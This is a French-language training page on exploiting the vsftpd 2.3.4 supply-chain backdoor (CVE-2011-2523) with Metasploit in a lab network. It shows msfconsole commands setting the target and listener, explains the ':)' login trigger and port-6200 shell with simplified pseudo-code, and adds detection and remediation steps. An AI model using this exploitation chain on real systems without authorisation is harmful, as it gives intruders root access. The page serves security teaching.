Configuration — RHOSTS et LHOST

Le module a besoin de savoir qui attaquer et où la cible doit rappeler.

msfconsole
msf exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.20
RHOSTS => 192.168.56.20
msf exploit(vsftpd_234_backdoor) > set LHOST 192.168.56.10
LHOST => 192.168.56.10
RHOSTSRemote HOST — l'adresse de la cible. Toujours réglé en premier. LHOSTLocal HOST — ton IP à toi (l'attaquant), sur laquelle Metasploit écoute la connexion retour. à retenirRHOST = la cible · LHOST = toi. L'ordre méthodique : module → RHOSTS → LHOST → exploit.

Ce qu'il faut vraiment comprendre

Backdoor ≠ vulnérabilité classique

Une faille logique (débordement, injection) s'exploite en détournant un comportement du programme. Une backdoor comme celle de vsftpd 2.3.4 est du code ajouté délibérément dans le source officiel : il suffit de déclencher le motif prévu.

Reverse shell : la cible rappelle l'attaquant

Un shell "direct" ferait se connecter Kali vers la cible. Un shell "reverse" fait l'inverse : la cible initie la connexion vers Kali (LHOST/LPORT), souvent pour contourner des restrictions réseau côté cible.

Pourquoi un accès root direct

Le niveau de privilège obtenu dépend du compte sous lequel tournait le service compromis. vsftpd tournait ici en root — configuration dangereuse mais fréquente sur les vieux systèmes non durcis.

Anatomie de la backdoor

Ce n'est pas une faille de vsftpd — c'est une archive piégée. Comprendre la différence change la façon de chercher ce genre d'incident.

Une chaîne d'approvisionnement compromise

Entre le 30 juin et le 3 juillet 2011, l'archive vsftpd-2.3.4.tar.gz proposée sur le site officiel a été remplacée par une version modifiée (CVE-2011-2523). Le numéro de version affiché restait "2.3.4" : rien dans le nom du fichier ne permettait de distinguer l'archive légitime de la piégée.

Le déclencheur

Le code ajouté observait le nom d'utilisateur envoyé au moment du login FTP. S'il contenait la séquence ":)", le processus ouvrait un shell brut sur le port TCP 6200, accessible ensuite à quiconque s'y connectait.

reconstruction pédagogique — pas le code source exact
// principe du contrôle ajouté au login FTP (simplifié)
if (strstr(username, ":)") != NULL) {
    // ouvre un shell brut sur le port 6200, sans vérifier le mot de passe
    listen_and_spawn_shell(6200);
}

Pourquoi ça change la méthode de recherche

Une faille "classique" s'exploite en étudiant le comportement du programme. Une archive piégée ne se voit pas en auditant le code de vsftpd — seule une vérification d'intégrité (hash comparé à celui publié par les mainteneurs) l'aurait révélée.

Détection & remédiation

Le point de vue du défenseur : comment cet incident aurait pu être repéré.

md5sum / sha256sum archive.tar.gzcomparer le hash à celui publié par les mainteneurs avant compilation — seule vérification qui aurait détecté celle-ci
netstat -tulpn / ss -tulpnun port 6200/tcp ouvert et non documenté est un signal fort à surveiller
règle IDS dédiéesignature connue pour ce motif de login — détecte en surveillance réseau continue
vsftpd ≥ 2.3.5version corrigée ; ne pas faire tourner en root limite aussi l'impact

Terminal d'entraînement

Rejoue la chaîne complète. Le cœur de l'exercice : lire la sortie nmap, choisir le bon port, puis mener l'exploitation jusqu'au shell root — et explorer librement à la fin.
